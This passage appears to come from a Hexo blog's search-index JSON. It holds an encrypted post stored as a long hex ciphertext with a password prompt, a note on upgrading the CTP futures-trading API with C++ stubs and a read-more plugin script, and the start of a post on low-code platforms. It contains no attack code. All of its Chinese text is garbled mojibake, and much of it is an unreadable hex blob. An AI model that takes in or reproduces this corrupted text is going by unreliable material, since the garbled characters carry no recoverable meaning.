è®¡åˆ’",url:"/posts/860c6c02.html",text:"4cfab7e4fdfd9afdbf1592f9652b8a194263aa6a7e6b4c103fbd9ff49c09b0448cdca81362464dc5686f95504da6299b6490ac25c35cdeb830b4ba7a9cf2685b51e73c35435eed90a9068092b489c658b028b33e5f1ab05d76df0373120c8983d98e4470f24650b2b21743d5f7cf39432d8b4d8045c4fbf88c8d8c159efa793fbec55d9e9eabf0365d47a5212e1f3e36462f38bda587cfecb0dd3d662f93873bb67804978c871968443060e32f8fa05e310fe6fd6b66c545adad8bcd9970ed074dc2ed1df02b70c21593cdd3a7a0be8bfbdfe746e958fd052b06048eebb7b8190cdad8d3cad2e55034c595374ffcc92f46c01449395f46b5e7885bff538e593635d4748aa16fe58d2b0c25693bbe3e6972ab55df1737f89c5b8df9921abdefea1a62517a98350f1f4d235aa5f0882ce35e47db139c79fd8214256fbc410ee7a60f81131e393017ab0ab347222d9e65124906bc2a2626db0ac667c5cef6ba6e38b930e99b06f23fae81cb31473e4b09801b92a2213c7d789068529cdcaf15c643f06dcff36be4a88c03a7cb9f0f61616fdcd3687baa98653c91e269d87ff1baf0d8480f82671f33854a07175167732ccde920155e48790cee3d0f8aa5a621e4997cb8e8cfc003d204be2803a7c47b03d8be8c154f7f3e660c3e66817f7e108c2a204a6d005b8adf35eaa038eb630c58c55c218c94085acd12279517f3146b1e6729c0b60d6f4eebd6929396f5ea8b9cd24c956673629ad6d4a1f1a4e6fdf7903906b9547b1699524f2c40c66bd4d9615fc34a06830f37328583dc263b72bfde76f88e7533f84ea91c66d7d707f57ddca96368f6eb9920cfac9277d74c35e131f12c1d1790902d0dff610fa7ce886894748b2780bb5ad6090155c1e734af1e389aaa3cfde16e0262341518fac978209b4ccc91bd638278c093c47ebecb8d4636666134382772d91c60ab7b1f9b5a35863e24ccafcd7ff3ba13bd17902a786e15933a1cbf840f82c8dfd822afd4aff1e77eac8f0fec4bc14604dc24fbc3b826e6dd3e24725660a4c843025f30d7e62cb0cfa232992fc280fca29894fac0de94e362800065d90dd54ed74df2085ccb8f87b30fed3d00add18504293db88695763db8d333d8c4226095e53d2cf11d217eb18fcafaaaa848ec9285139130d690b2d851fd00d54d57bd15d315fb0f9e733c57e0b945e75f34a29a86133a4af142dd1862bf41948410f78744f13a3f7bf4ed09a25909c75849270aa9e4a9e13bcde963e80344755c044ed0f0721ebaf0b98b6c6ceee61d45de0b5b2ab97756b6a468505a79d78134bdaff7269fb3b49a8fee5f96665aa7e07c887b6d01dad30aca3d83b2ea228701dd62b77a159a8d6530e1e5974cf75b7ed352b0bde051cece9be8149370571cd20448fc4c5739c2457fb03160d7446eaf11191014bba7538ec5e96a4ffd4533be633ef7f5d4000683208f17b6431e79f51efffde1a0ec186e951a7cbfdda7da4f0d164e2cb55c796289310706d2b9749a9b5abc3b49741bffdb48d7b7f7fd29ad2fba364711c49f46ff7491f850fdd967dec7f7c0080e77420beee3f409e58a348e78f171cf6137783e3a9af1938f08ae2e3c2ef99420fa3801889cf00d84c8b82e155a8584c694ef3bd48647f1989cd93accb19617e92d5e8dba325651ce318c1fdc1e22eba130662c5eae90486c4c786242a416173b4f773759e34e819354a72f829bf8d36dc9250f234d8022b96ff858623d4b09eeec0dff3aee1dbf5fe53a16a7aa774fda739eb4bf5d17aa96675bfaa5fb46255e0834337d4687fa2328cce510d5e414f49b1932d31008c545a8933bdfa8cdb672b104b055ac22c63946e7483cee3735e173bf1a98f1337df73ca561264022ded335d3e4e039bf9f6bd3c2292fb8916cccb32d11f9b695b808cd3c1fd8f2e10944dc0fb49b72de482c1e18c2cbc7bf055a2a0234ffc63307e6343a5d95b96ab7f17030e24775d720550cf7cd1080ca23985702ce895a05aa30ab11ac58a16e9237896213fe23007c63daac9d1b8b30721a9db82403517d01425671f57bb1e6846f3eefc2194a363a54d066fc707fda5026ddac4863236174dad20691997f03feecea3f68a5faae0cbe411e1b32eb6d2035e4c8edcdd8289ff45829b6c258624b194354a6f3acc0da287669a66f2cead1add3078179157c333dad03912944c6101df646e963b46c44b7ff589b077a73c5e0cf5667b04725ef5ce4df5855af2dd0a68b3e645204595270fa827f16876091d5c737bf8429aa21a95e2be8577f44639fb41a2a92837712e444984bca60b75dbcf085fbb8f7bdf01a5d831f85123544d305baa2bc5e030a523b2a8ea485ca05870083cfeabf8b9794b534f5d9f21451cbfd8410d933c9aa086fea9c2421f20b07eccd5e98229ce52234e6baf275514820d2be2b4183e97e2a05190ee27e0a9b79f599c3a6bbbfe6c43afc988008cf227f2d79909ff8d8b6f63293b3bcbf7468697b08ef9a189ef7dc5ed3a1073e40268f5e2683b52b52f6c9f5879b9c90459c552d53acacbb2e564d9f0264aa5e767771a00dbca5aebfd234771d109c391a2f05e036a81ac456fc1da1bf0b14e89e096f66b6da98272dc3b7d64d2916ee21f1c5ac48843ceb2089f5061de19051d23dda95d93cf002d92dc2a13ce5fb2151d61e9fb671cbdc1a2ecfed0f70018414d4ceebc171cc45e5a47365cf29b63303f287eedd84843a540e2138f9ae5f33d30d9f4dac3ac61b14e2d777b4a6dfe7ae5e11ea8784645c6767d04c792974fecb3946e5f77f3a40e54d943ce9cd9d1d84bd29a966de729d9b7de5915502f9dacc172ca342c7ec7e63dbaec5aaa4704e50a9cea357518c802eb70af4c9318e4be2dd9a0c947000f66060980113b8c902df07d66cfb551a969d228cab8bb29037e8e714aeea65646d0a25b0e66b84e561fc1277bbe50f907a9353dbe2cd5167faba074fd3043ea566633f8fbc8d97fe01607081f620098d47a01603bed5e137fbb91c80f64bcde63510d1a782fab4a5e5dbdb596fd772da4e593ae1d9e9d153c9aabfda89be544e5b4294eac438c9b9d34bf51c1ae1649d5d7e01f57a2dd7c23c05c26dd63193e707b5ac849c59e056cae16af40acf495460e7e6ce721e3131afe94d7e3f3025fbd7c7a90e95a09369f8fc30c8af46a3632e64469e622620195f2587060239c4a6253e9d4a9c03919c82cefcceb6d8228db732666e7fe221c9709587c8819efc1fbd3e3a141f924ebd8c1ecb4924c09d1f593f50f2146aa2638c916954a7862b2344a68f08ae5195674e61b83d643a22e09e7d9c866f2709041b2b15af9a4807dc9e87d5919d199f9c2edc185936859730b9f70875ad55094cff3f9277eca5217930dec1927543b7f78c9e03f96a5028a8b0faf39c3c28e79eb3f6696cfe9bcb4fe61134ed13ed1fafdf0d90683d648f44cd942c47d130bf7060f4ed2372b442954b77cbc6800f800deecdfbe4a0dce99e1196bfbbf3601a90d43d1ef70e363c3fd90c3da775e55039279a4acc022bfd545fdaf5e930f2eacf8b391344feffd33bd33b11df61514fcfe6311202a29e74ac20dab3c16192d4bd607f19727a9eb24b1cd4b50844736248fa5bdc7de27a11903e9cae48c9b0e992c279376c2b8c3d8d670770ea38d4bf4c4a58b47bde72e1c30fe66e9bfc098ed19163a0eb69a16c914f180049c96209e43dca42cea109c1ebc7fa07250ca28c4753627aa3b47a84ea31d161480806b89b02b9ca845b74465e36bee5e80bdc541a79a5af5b795c3d3f65a629583ec806b5992a34018efaef1da551c5f13674d205948e0160377326d5b721e8a77f4606a35296e90c08d5f9f56b42b5965f8852fd94686068d5a15c2c2b89e005d4b45d6156bd72b2fc5e09534863c7b8915c547a9c38272e06b23f98063b5f3356630e385337fed42879ff175eecc1e03d6919517d8eab47397cbb2131f63d111245671c8126059b51ec4f0762c842c13c3a67a206dcf6ebec6cece65d56967626a63eb42fefa2020c97c3c76e3617b2b072bae2fa279cc704291e6cc465164421a0e5ef584c03cd1faa85403802587bea90a71a3cf2888089ff21bea0683b9a6ebb59d9988523bd44f716e8908ed64145eb280d2135e4610a78fc3a492046eb1a21d695f9a89690d2921687d8af90f40fd774a4bec089ca95001d62b66ecec620b0f94353b2912fab3e3f27e2db5b6c63b28b169c3fc22e0ed36c4fb8984de014df53b80391121a161067730d43fa6c2fe1ac07157f893444695cd46634f01c342e55de153bf33ff32ad4d01ae058cbc5819594d75c8f2775de1b78b206778132a4baf40973533351e7e61325e13984338b92ec3fc2fe96b9d23fb00097c70eea1be15d742687eab294ca6e7d9352c7931f09b1714bc31e5fca7808bd3bce907d96f64c61529fb48e16b4accf8aae354994f53b27a7c46557db229e94597fc3d258d70d8e00674aff2720048972636f5241dad6453d3f96fe46acf499e2677401f505babbafa4ad904d1adf2d9e8d651a209689fbc58a20cb33546ac9c9a7bcc3f227e9d582ecd61cbf66f91c3b9db0d4e0e1119b73823b8c749d09e6afb0462885bc9c695761c3e7fcb8472d37bcbcb0772ae265c24b29e7d14b0799ed831972f63acd1fdd052fe5622ca3ea8fc64de5ab651923f164cd5dbbb9229049b633d6d1fd75672bedebd3da00eca7f340a825e4945cbb80bafa3c501ed4cd4279848b6dd132443256672134bc6980f83e4e6ee4dd912950106528349e0ec481c93ec251fdaf15eff77374e06e5d5b0ed6a6dfdc120632ccbd3307dd760697a8f2dae197e09d34898210551f5e575139f9279a801d086c591aff86056bee0401fd09db0350e3c5dda4d8a77a6b55a895e544517e64a4e0a9e8005f6739e42be3c69d4a3eb41bba82f4d8476bf572e319f15af2131768d8275b10128feabc90029ca2ec409c38e225e5e2d9cad323dc2fd75ee0c98da398b5ba465c76fb48e1ca8e008f684daece647b96f568ea0c2e14bb5eafa1d5551d3c0c39cea17448cd426ac1b42d079aefa756b92f56fa5679f794dab2ff0b44249c5c510aaa3e237e3469a6baf4a7e98daddd9d917631b9b7bb63008be0ca49c2e4669af155d4182a171121f8f5de40cd95abbcd6bed77c663a4c4db83cc8f1ec76fe80171b02a1a93f80739c8b712c52b19f33edd91f5685720c1787bf33536b7de5759b1a7bdb5da86f09a2fbd1ab4ec51fc987fac7009181a41ab44ef424624bc1b832c4e68e9658b9922f559fb0eae11a682ef3ad9049b2caedc2ec75ab32f937b1d278ec6ec6508b2c9eedf958132c3ebe44e497adcf9080ff4c1b9954e6075fff5b739bdfb2edd4c49a0e6ccb84a075b74116447a1b9378efb16a6fe5a0867497001148a912f56a5a58b59f620288dcc3087ec02808541d0901f53f537cc9ddc2fdbd30863d5ee4b803256e9bd05c2fd9953f92cc786df4990fa68ddffeb295ffe7d24b3b3502a26a727a9d89283cca32f1dbfbdf2043fbd29736cb5436ebc6158120ff876821076889581237a1c9a6e16d3023c99ecdb7642fcb56fabf2dc7a8805170ef0cc077cbc33a01967680dce3728d0351aecbd4a0ceeffdfd0aacf5fe228bb0544cd6e068d878cc68415679e2cbdfe7ce9ec3233426e1b6d02f25736772f129bc705e9beccb7ae90abad9a358d6e9320ba4f4cc67d8ce1776d8f786493bfed3947f86ed5494aa1edbd8be964d7df2a28766d1171a9dceb75ffce42c13d0e1293081658014a554bf35f74cdd5c3c02f6031e81ad4d7dcedd3cb5ad5a8700fe1af8619ac671a3d143bd0779e10971cb9d6dc94d77e6ffe61a9288806a907cb536ab51e3347de4deabbd68b24a9000fb74ec8c6ddf06cd6a0db3c51abcfba95654195a667b7e111f65873432cba79fba94b1c730c4ec9677ac557f4567d48828b011eba525fe1fad166f02cb43adfbac89454316a8be0ff001fe184ba0e5ee17e44534c09a97970a90e33a38f8217b93ee89ee42b1774345c9f09f94913d14201ba1a232cf01d6605b76342f73ed087b5166e406081b497ede0d39e607db29b1dc7482dab3fe8ccb742685b988dc841f2e4ea634812c7bb9e42041fa4eeae7cd068588551510e008928fb3231c3a8ac25a604af425b478c4669a93f006f1f6f2ef62738ace77eb8a1073caeaba136c3cb55c9ce4a34788a8d13ba718bf777e6e08b24d958260c157ce567d147c04621fd41ce9149d9f8db9d07da0400a409a64ceae52be83be3b4e2505286f20115a991d68516c4150b16201eb33d9e8ef29860d73f83acf19ca2f3c6127e69352081d32ad3f5c03190564530864d13e90f8d1d96297c2eff1a2d1c2466348cbca9cc1cbc14d32c107da2e6a446387e88548460ed06b4b2111684c2717f6ede48b8e94ddf4123c8b6eec4d3a6c9754d28682cf5e735de9244fc50f9c92927c50666bb6e3cb012a07ee6addf86e6c043c58ec021ab30117905687a42b4569ba2f870c0583463a6f0e5ea06fc8e3ba4a0daf9bcd37ac02a6822bde47c902d66f0bb41c9dcef404b90f38cf7e6421e9f9df272735eb2640b6d9276767e0cf0f105196d2c31e196ff9b3498d6f61be82aec9211b6a2ee18d0ac70f151c39c18a95a423a28dfa3279a5b8f5f5cc771809bf356d8382749a31d916a7f8024138c1520167f51d90aa8ed093c5f515b804dec673ad31cb361e7e9f4502da074984b9d4d1696751eb797927c9fad90a370cb4fd1fe36917ed370663dee1167b4adaba48a6fe2c318ece4ac13ae7603bd31d4c3558c72d5d6fcb93f1f432dc39af6d0e951810cb74ed0e9e37b7b9b7339a754ca02a27d822eba32f26b836a143fcd906d15ea0f1b77069b1b36bac9f6fe3a13e039c653e98f9c63b8c640882f88d4d6f35b70982ea19d471b9d155d00ff5a669c6679f8929228372b1ef47a7d4d56b0a36387daf2d44b1765c32b078b3e7888ce5e095bfe27ed4dcd6824cf72d9e8ca39b92c6a1145891031ae73ffa8267fb057bd2a2b6a484b592d3453c03e8646e73c7a066d4250b72545d134a6a34102e035e11a2c4909c2ada9c12af09cc6651e025207a96f8e0bd240391b8a8fcb704e7f82bbdf94e31d631e82c7c577f9938f4f1264321ae112036fe9b1d0ccfb680e848b231da6b70e8bb91bb005878c23f33f04b25e8bd33d59f1bd85097c878634e5bbee4e871255e5f41edb6c6b8a9517c9050857f57c79e1ec1507bda8bde753ac42e7fbfe61291b30fcdee2f5eb8c1f60bddedb1f14d76be2ed9c0540913cfa0e721b718e11e2ebddfaa41efd0514788df8cc18c572a34d18ce418f627155a3891a150a4aaedc472945f39a5615cfd88e77af87b3f973c32dd26748d12030aa71970bb353e88ad3f59cc6a56919e8b21db647893d09fab772634318bcf0aa6d11f646a8ea7995165190bb2210cdaaa538d69c6d6181fb90320c2f969b5d0e51fe2c85ba16d21605d91a1391dc5414040602f5553e6214ecc6e15c083ad8094636448584d88bedd43a1c417afcee77d08227a8b54223564f9b82df68b4596c5ed5f060c23f728bb01c8d93f121ee467dd71165a66b20352d639acc6e8fa72f14bf53099e13614ca38657963fa42e72ca4d41d4855b6c43ddda3b97b703e5f4205667fa54dbc36d26dcfb45f986b17d0dd49cbdd663b1e57449520827f063d8d166ba2976e812141b45c1bfe5952b78898b0f48dd4f878a1f615f651ba9a56ec8951483fcf3adb6fbfd7e82c8351cce50ef53aba4de3587ce806fc383f7b52d3d67266e00308301750a00f0d02744e864d3ac4d4b841cd6bdb38b29f48853f3e255aab6b2115091e7e31299b61864952d954c3da34c068e23a69c0dce1562bdf7376f76d6230997d454615ecac2a16f2a7bad993af67a816805c042e5438036e09f67d40af6541a0b032b4e0fac1097a2b6c500c9e782702d05f067fabcbf695346dfe6bfffe9500e5f1f7b0d7fa5ac11c293260e994e6bf3fab7f311bc78309ad04c225625c6e25653c7000c39838b5e380d5962916b1db176ee859f36f5534f212f53a97fc314d8049018484c9b573e32fc9c3b076c3bc63aaf3236bd21bc54bffa7bd9f5a0722412180a82fe68c3238f5bb7b9407ea75d42ff5939b221130db75ba9f09c76baec0f22f2f8da0a33f1c57b5cf412f254751cd53a7ece5a05463c9c5316cd1c112c9c24400d4f2beb7116aab0d06de8b26416a6a0c8cfada4b2140d39b576f262ab781e444bf1bace51182da55f82705cdb37e0863e6d4aa978e571bd1e35052e041c297a244e38a6418892321b245587c7e8d6a370ba1ef0408dfa960362f94eeec9a39d5ab9f2e02b02cd53a6288d8c98ef5120f83190aa3db92b1f818ef85e7227302b6410f9c5bf69c9407614aa8a9b4f364d17d4b8085fe23a03da1ccb1beefa045179aad91839defb1af0d69ecd98d9869f97a7f9f13e3eb31d5853882d2e7c0c01c3537e77ec365c7780132d89e3d7632589138ad8bc4abf106ee46f746b527bd00d96f996f7c32a25497a1d095428e1d2a21e556a03a77a5f1cb5a0cfc03eff86fb4fade7b670f037e551277840031f067dfd0622b7568a20a1de0026392112d846a8933678f012a2084d5be8c8550b8a7104f1caf08a0a9b5cc97ef7df7619429bf552ec401b26dd11409649295256ecf6df0e58226ac89f5e5017026ddbb5c54ba6f2d1e40a708fbcef609ad673c941eff5f9e619754fefcd62a527a2729f0ff8a3aa713d17889eecdb8375f40b994f7849752c654411714a4a129a4d1bf7705959b5f243ace8f3e5a09ed0e4485f8a209b9f92ff1408ddef1a94336234b6beec3ff12e37cd285ac775df4124a2f9b428d848dbde0308364cec233746ea06d1ab498370ffe9556c9e23f75bb0a462a2569117dd693775e935af51de91949254c0e75518bb0dbc861d6d461ebcb2299935dc3336ef6c57795921132fbc406160c1e5f09f7ebaa5c178dcf1254f6ce3498ac82ca4a3996c52dbb3ad7f1219602f968240c34fdb50d16923344c72e8a5683aec564de22f1404acbaa33c3a6901c7057e61ca809db39f5f6a01d307f69205714e5f16803be3fee97c3496c74c6eefcc0fb2d51a2a50b6dcf21c02e1c2bbd3e0031375b451f23edb41819cc95fd1e791604463d0d09cb91c3984114012436bf9c12de99f3a521d81803887afc18b9999a142ca2ece745aaeae505989722e68841f07809167c8a6b03417d985276b122166a4439e93510470fc581a00ad27cf423e47a0d34789ae9c385bc2824b16f12b697541c7f371dd76d7c9df90a0d2d8ca6fddc86b7087e79edcda46c83af35e12af3d02a47d1c51e915f06ddca2e9a65fd26f61f4301ef712782c80ebbc3d26f52f7c7425c5d0ef889d6d4e454f4b0fed069c683da5991ba08d0a5104e8cc6ad9362cbfb088712fc8dc3de2d4cc2650156979b077c208223e3df6afe2f95cbc9975a487a1ee092a93cf8c8c26b4ca8b3e46cb831fcaa566295dd27796cb56a3cc95da57db1d8d3723024d6d2ff8302f9ab67a9cc64d9a483faba4cd3ed13a0b5bee913b0b9a39e3ac17c69cafa653e8840963a468f373985e98339d17a0f77022ee2f3417b7ff25e822b5c0ca52eca40f88ebafe271ec7555156033533fbec0eab6864d448f79937ecfb4bbc45ec369b5d8e874b99b1f18593ab92ab745839db2ade0ee49bf49439f4d5e2fc6f36925c976899a9ccfbe675e36ab8ecdb75cb27977866752d699b23d059404df06600534605d1b5f85fac8b4014e7894ed9e9e8b7888c54397be482b83bf78e3d645732034d4eba7a4c2a20806506c2cd2ea02bac380943b9b943c91557f4c4ae5f6bdcccb80601fa0451f444ef04cbf971b9498fa673c41a74024b8dc4347fc2a504c2a222d83fcab8f4ed0de3689d64fe2bbb8ecfdbf31c063b2099a38e3857583b28707721e7535ad3381cb9f890925b6c06f9a53e9d599acb24405ecaf40ae276072ae7d428ca8841b960117721738410c1835fa3fe79544ed923c559e7ad50a4990dd01e5a0aa33531ca65ae76eba9dabf89f6aa7dfbdc1248853b451a447afa0428ec84ac452c2a51e8455947980147de69d978959fad7c97b7e81aa5b2896011d76bab44c9e4f84707da9c1bb6e37613f5c6a68980e8b1854f6045fd9328c911d0e35f444244324a625e6ccf005f564286ae55861cb87d1ee5dce0ba75c2f81e24f76c934f88e3778ffe1057e146d68f3cc591b90f4d4a1333d49c876a2c60d8c52f452b155be39ea28a13a26875fef68312089eec97ec53e9a2aaeaf38f2097119374a9989a39d41e18fcca841f8f3f4fe5a327228c303dc977866a41b3643e8f1aff5aa72d5fab47aee3566b8f46f01a72cc0d0b555f6a3b0f221d620cb1cc1e8c68a41cc9c7ba2e673a40f6e90bf883f513428fe7e7ef1c91f32e47867d3256f06c5c5135fb9769fcad3067bdbc1ddaa68c20167cd7db0335986a1f99e54a489e42cea37e8e7e2e619e2f58f74f7e210b34449ffddd7be5b9e2d4e2cfb6c4f063503171597fc49a2ee1acfa92c0b4d537994a689cf14dca37a8b1fc256941090a782b3f56498a4a2eb2b0117ed69a89b04a88447095cd5a671e2a812b7ba62e8feb1979eafb67651be929bc12a1c978912bc7f044e1d39d8daa2616f8f84842b8a9d6780aff3ae7ac71925d0999049eb70ed1565a3f34fd1355669d180929c92ef1c1df2c84e8a2640e10d2612b3261a60a6ff8b3f5931cfbf905924f1049629718274dcffbc2d0a290d8ad3e1200796f9586ec27c82bc160368b46d40f53d71a6cdc6cff0648ff0d1429cbeaefb87e1cc0afcfe51eacf012e4030a39bbbb093cc3cd106fe389d2f5dcb9921ef66c5e829740919f0afdc8bdfd64c8944f1a49b22de1b942fd079f2096a9d88fe44159054ff29ab15c90664f561dc2b6790be3ebb06eb3ebe80bcb56cfc56f02708e0332d8e04c675a9ccffe7a446f523631f327baedfff2a4500347111001be59811a7ce4381a49b824e9dde2a75e37218de61739f7b0b35052785d309bdbd96743dc4068af42701b06ae2228d43e5e46333bf0fdd6986b7e61d8ebabde5e3afc9cdc9ee63dc2da02c3d881c3803bdb6dc608d6eee6444bed5a21d8d24df2c1029b2fb27d5ce3eeb2e88d6a4cbfd42153b330d83a46b827ee5c714284bf4148ef9e1c9f26987239d76297ed75549c73af135e2cb6c5c6ec986494ccfcd74aa19bdef364202cb3c1afc9666e9914edb8d43debff1a81e41df381363a220a49b9b26d1ca8b26b4abe2985d8e9e9cadc89824eee42c4224d9514f5d1a7c281c882650ec298180b98da4e2931267e4d27fa2032c4112f03c5369349affa461a5046083506cdd689e7f12611e3dc2d9c4462a358cc59e7ff2040f0b92f31578af3f909f003ff30b2ec5fe2bd1b8fe459da31d763d5a6bd3bd468dd1ec47b3e3c175455fe81cb88d96608443a334ec0937d2e4033c71f5c482ec5293770ca7a7e42d472113981b30376bf02113f3d68625dfd1f2b3235ac3f7d3a3d6898f7992d32832d73366b5db15184059e8e163cda04b754434d6eb4b6ea1ff8d67feda9840006d03f6a3a74b823a41c5ce67732d67ff4e1b17395e5441b51cb5650adf59e8ceabd132778408704cb06b92b5fc4786065a78e734a78717f36fb90ee36875b2d985f0f8caf5e04128383b025f25818e31409fb1b6623124f16eb8146430684a58d7733583f2ea1601c6867d3825b9093a17f4eee1285e1565f494d73aa03f9c7b23337754634f21588574eee77a1813fd42a5dc785a5a350f7620b4f520fc36ffb29a6219ba37386af19d162638c4cc464b5eb819575fd4bdfd65f47c9d470d1c8e956c5dd7505aca92d233ebf3f4aa7c2f07eb590135f656a733d3f2dc7259da275c73edc94a436cc7eafe3311da554541b4fbb1e672d80e5044e8717c8cec96128e9f26493b6fad48ab011187996e66a5dd01168c383387b6ec150728ab4db5253a92225b549f172561c5ab6696d3b5e90c96a8eb7dfd9c7e1c6dda0e377ebf61d390b8d978f4f8a06413f1586dbc0d6e7c2dfdb48205d3751f86b41776622bc3b5e6783987ffea634b55ba38faa1a7e70ab355df4a4be00b558b45b5acd1022a1c679612351c08019c37c29b63a35956e8f67e556449daa384fadb18fe5d755fb8fdbdfcd8500afe38ecff3c17158e62c3218bb685c9f794303e268b8f696d1c32d98992611dcec74554fae4deab8b5a2e08819e81a85abc4b93cdcfd1e702f09a9cfee8a800a57dc74a7821e3883c791f2285ff72c79682aaadb29b3ea20804a09a238696277b1627d40cdd6966dcdbe42802a3696aa5fc4e654965ae5843d12ffef4b4faa1f3b5c8c2a4c9bbb3f02e0ccb0b87357d0173d5884ee49b1c5ab4ccad0b438b5b253a6746e2d9f16bdfac564b685e35b3e4ab6f8ae06afa9dced0c9c207ed6653b6dbcebf8a276b591b15e6d24b6848fe217a0f10bcb9779838fa0a9180539c453d622b9f1d9607d91d3b6b5f698273c03644dd588e8dcea2431a5f73c8a2c3baf0457a8b2ee795a9103951d6019b62b5734194a186efe58559a007b82ecb918a9fbca1f5ae2c2772fb42dc931f7a7e0edf11adebb5f498b3acb3994cb461b344625c1ad869c85169efaf76d38abaa367279ded3c186888726bb2f288f4cbe01a42225f0612bf0b3ddac2518349554c2798b7c7761d2b8b584a54dead3b015577777f4b7e0a1e413f377f335a04caa0edc57e46cfdc2e2cffd0786fc5295dbf497a845dd943a460be545913aa650f08801f4a1f08489ea539699e3bda5ef236346f93d7e673bf664c34789667bc5514f279f328a118349d0544798572acd45c8663a9ee76bc7bbecec23b90e71f8729272676339f4547f8b8bb8cd48487d9c5c5e2ffc3bda09718124224ea3f9494209af9f11d55d4e4e230f49232c2053afb156a27cc5616eb49006147be0bfc5bc6652fe5062c00b53cdebe5 è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢"},{title:"CTP å¼€å‘éšç¬”",url:"/posts/790d6d80.html",text:'API ç‰ˆæœ¬å‡çº§æç¤º CTP API ç‰ˆæœ¬è¯´æ˜ CTP API å„ç‰ˆæœ¬å®˜æ–¹ä¸‹è½½ ä¸‹é¢å°†ä»¥ v6.3.15 ç‰ˆæœ¬å‡çº§åˆ° v6.6.1_P1 ç‰ˆæœ¬ä¸¾ä¾‹ï¼ŒåŒæ ·é€‚ç”¨äºå°† v6.3.19_P1 ç‰ˆæœ¬å‡çº§åˆ° v6.6.1_P1 ç¬¬ä¸€æ­¥ä»å®˜ç½‘ä¸‹è½½ v6.6.1_P1_20210406 ç‰ˆæœ¬çš„ APIï¼Œç„¶åè§£å‹å¹¶å°† .h å¤´æ–‡ä»¶å’Œ .DLL æ–‡ä»¶æ‹·è´åˆ° C/C++ é¡¹ç›®é‡Œï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œå°†åŸæœ‰çš„ API æ–‡ä»¶æ›¿æ¢æ‰å³å¯ã€‚ ç¬¬äºŒæ­¥v6.6.1_P1 ç›¸æ¯” v6.3.15ï¼Œå…¶ä¸­ä¸€ä¸ªä¸åŒçš„åœ°æ–¹ï¼Œå°±æ˜¯å‡½æ•°é‡Œçš„ç»“æ„ä½“åç§°æ›´æ”¹äº†ã€‚å› æ­¤éœ€è¦åœ¨ IDE é‡Œå…¨å±€å°† CThostFtdcQueryMaxOrderVolumeField æ›¿æ¢ä¸º CThostFtdcQryMaxOrderVolumeFieldï¼ŒåŒæ—¶å°† ReqQueryMaxOrderVolume æ›¿æ¢ä¸º ReqQryMaxOrderVolumeã€‚ ç¬¬ä¸‰æ­¥ç”±äº v6.6.1_P1 ç‰ˆæœ¬æ–°å¢äº†ä¸€äº›å‡½æ•°ï¼Œè‹¥é¡¹ç›®çš„ä»£ç æ˜¯åŸºäºå®˜æ–¹çš„ Demo è¿›è¡ŒäºŒæ¬¡å¼€å‘çš„ï¼Œé‚£ä¹ˆåˆ™éœ€è¦åœ¨ä¸‹è¿°çš„ C++ æºæ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹ä»£ç ï¼š traderApi.h 1234567891011///è¯·æ±‚æŸ¥è¯¢åˆ†ç±»åˆçº¦virtual int ReqQryClassifiedInstrument(CThostFtdcQryClassifiedInstrumentField *pQryClassifiedInstrument, int nRequestID);///è¯·æ±‚ç»„åˆä¼˜æƒ æ¯”ä¾‹virtual int ReqQryCombPromotionParam(CThostFtdcQryCombPromotionParamField *pQryCombPromotionParam, int nRequestID);///æŠ•èµ„è€…é£é™©ç»“ç®—æŒä»“æŸ¥è¯¢virtual int ReqQryRiskSettleInvstPosition(CThostFtdcQryRiskSettleInvstPositionField *pQryRiskSettleInvstPosition, int nRequestID);///é£é™©ç»“ç®—äº§å“æŸ¥è¯¢virtual int ReqQryRiskSettleProductStatus(CThostFtdcQryRiskSettleProductStatusField *pQryRiskSettleProductStatus, int nRequestID); traderApi.cpp 123456789101112131415int CTraderApi::ReqQryClassifiedInstrument(CThostFtdcQryClassifiedInstrumentField *pQryClassifiedInstrument, int nRequestID) {};int CTraderApi::ReqQryCombPromotionParam(CThostFtdcQryCombPromotionParamField *pQryCombPromotionParam, int nRequestID) {};int CTraderApi::ReqQryRiskSettleInvstPosition(CThostFtdcQryRiskSettleInvstPositionField *pQryRiskSettleInvstPosition, int nRequestID) {};int CTraderApi::ReqQryRiskSettleProductStatus(CThostFtdcQryRiskSettleProductStatusField *pQryRiskSettleProductStatus, int nRequestID) {}; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€å‘éšç¬” é‡åŒ–äº¤æ˜“"},{title:"åˆæ¢æœ€æµè¡Œçš„å‰ç«¯ä½ä»£ç å¹³å°",url:"/posts/65ee20c1.html",text:'å‰è¨€åœ¨ 2022 å¹´ï¼Œâ€œä½ä»£ç â€ æˆäº†çƒ­é—¨çš„è¯é¢˜ï¼Œå„å¤§äº‘å‚å•†éƒ½åœ¨è¿™ä¸ªé¢†åŸŸå‘åŠ›ã€‚é‚£ä¹ˆä½œä¸ºæ™®é€šçš„ä¼ä¸šï¼Œæ˜¯å¦ä¹Ÿå¯ä»¥æ·±åº¦å®šåˆ¶ä¸€å¥—è‡ªå·±çš„ â€œä½ä»£ç â€ å¹³å°å‘¢ï¼Ÿ äº‘å‚å•†çš„ä½ä»£ç å¹³å°é˜¿é‡Œäº‘é˜¿é‡Œäº‘æ¨å‡ºäº†æ˜“æ­ï¼Œé€šè¿‡ç®€å•çš„æ‹–æ‹½ã€é…ç½®ï¼Œå³å¯å®Œæˆä¸šåŠ¡åº”ç”¨çš„æ­å»ºã€‚æ—¨åœ¨ä¸ºå¹¿å¤§ä¸­å°ä¼ä¸šæä¾›ä¸€å¥—ä½æˆæœ¬çš„ä¼ä¸šåº”ç”¨æ­å»ºè§£å†³æ–¹æ¡ˆã€‚åº”ç”¨æ— ç¼æ¤å…¥é’‰é’‰ä¼ä¸šå·¥ä½œå°ï¼Œéšæ—¶éšåœ°ã€é«˜æ•ˆååŒã€‚ 